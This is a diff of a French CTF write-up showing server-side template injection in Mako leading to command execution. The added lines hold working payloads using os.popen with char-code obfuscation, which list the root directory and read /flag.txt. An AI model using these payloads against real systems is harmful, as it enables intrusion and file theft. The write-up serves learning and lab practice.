@@ -112,7 +112,7 @@ Maintenant qu'on sais qu'on est sur du mako et que mako est basé sous python al
 
 Maintenant qu'on est sur Mako et qu'on veux effectuer une RCE nous allons tentez les différentes solution qui nous sont présenté. (Pas toutes).
 
-![](../../Pasted%20image%2020260516173803.png)
+![](../img/Pasted%20image%2020260516173803.png)
 
 Je vais tenter de copier coller pour la première, la deuxième mais aussi pour la 10ème voir ce que ça donne.
 
@@ -129,4 +129,55 @@ ici cela va utiliser os.popen qui permet d'exécuté une commande via la librair
 
 Globalement cela va exécuté la commande "id" dans le input et nous renvoyer le résultat de la commande. 
 
-testons maintenant. 
+testons maintenant : 
+
+![](../img/Pasted%20image%2020260516174845.png)
+
+Bingo!
+
+Maintenant il faut qu'on exécute et qu'on regarde les fichiers ce trouvant dans le répertoire racine. 
+
+
+Pour cela on va faire ls -la / 
+
+Ce qui donne dans le payload : 
+
+```python
+${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[108,115,32,45,108,97,32,47])).read()}
+```
+
+
+![](../img/Pasted%20image%2020260516175508.png)
+
+Bingo Bon c'est pas trop joli regardons dans un fichier texte de base. 
+
+![](../img/Pasted%20image%2020260516175545.png)
+
+
+C'est plus jolie mais on peut voir surtout que sur la troisième lignes nous avons flag.txt qui se trouve dans le répertoire racine comme dans le code source. On va pouvoir maintenant le lire en faisant : 
+
+cat /flag.txt
+
+Pour tout ce qui est traduction de text en ascii j'utilise ce site : 
+
+https://www.browserling.com/tools/text-to-ascii
+
+99 97 116 32 47 102 108 97 103 46 116 120 116
+
+Voici la chaine renvoyer lorsqu'on fait cat /flag.txt sur le site. 
+
+
+Maintenant il suffit de le mettre dans notre payload. 
+
+```python
+${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99,97,116,32,47,102,108,97,103,46,116,120,116])).read()}
+```
+
+![](../img/Pasted%20image%2020260516180044.png)
+
+Bingo ! 
+
+Prenons nos points. 
+
+![](../img/Pasted%20image%2020260516180102.png)
+
